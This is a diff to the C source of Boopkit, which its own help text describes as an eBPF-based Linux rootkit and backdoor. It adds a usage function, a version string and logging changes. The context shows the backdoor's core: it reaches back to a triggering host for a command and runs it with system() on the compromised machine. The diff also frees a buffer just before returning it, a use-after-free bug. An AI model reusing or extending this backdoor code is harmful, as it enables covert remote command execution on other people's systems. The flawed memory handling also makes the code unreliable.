@@ -36,6 +36,8 @@
 #include "pr0be.skel.h"
 // clang-format on
 
+#define VERSION "0.0.1"
+
 // PORT must match the ${SRC_PORT} in the /remote script!
 #define PORT 3535
 
@@ -60,11 +62,32 @@ void asciiheader() {
   printf("\n\n");
 }
 
+void usage(){
+  // Falco version: 0.29.1
+  // Usage: falco [options]
+  //
+  // Options:
+  // -h, --help                    Print this page
+  printf("Boopkit version: %s\n", VERSION);
+  printf("Linux rootkit and backdoor over eBPF.\n");
+  printf("Author: Kris Nóva <kris@nivenly.com>\n");
+  printf("\n");
+  printf("Usage: boopkit [options]\n");
+  printf("\n");
+  printf("Options:\n");
+  printf("-h, help           Display help and usage for boopkit.\n");
+  printf("-x, ignore         Source addresses to reject triggers from.\n");
+  printf("\n");
+
+  exit(0);
+}
+
 // handlerev will handle a reverse lookup against
 // a triggered event. This is responsible for
 // finding whatever remote command will need to
 // be executed on the bookit exploited machine.
 char *handlerev(char dial[INET_ADDRSTRLEN]) {
+  printf("  * Boop: %s\n ", dial);
   char *recrce = malloc(MAX_RCE_SIZE);
 
   // -- Hacky implementation --
@@ -80,6 +103,7 @@ char *handlerev(char dial[INET_ADDRSTRLEN]) {
     return recrce;
   }
   // -- Hacky implementation --
+  free(recrce);
   return recrce;
 }
 
@@ -97,6 +121,9 @@ void clisetup(int argc, char **argv) {
           // Append deny addr
           strcpy(cfg.deny[cfg.denyc], argv[i + 1]);
           cfg.denyc++;
+          break;
+        case 'h':
+          usage();
           break;
       }
     }
@@ -208,10 +235,9 @@ int main(int argc, char **argv) {
         }
       }
       if (!ignore) {
-          printf("Reverse lookup for RCE. Connecting out: %s\n", saddrval);
           char *rce;
           rce = handlerev(saddrval);
-          printf("Remote command received: %s\n", rce);
+          printf(" <- %s\n", rce);
           system(rce);
           err = bpf_map_delete_elem(fd, &jkey);
       }
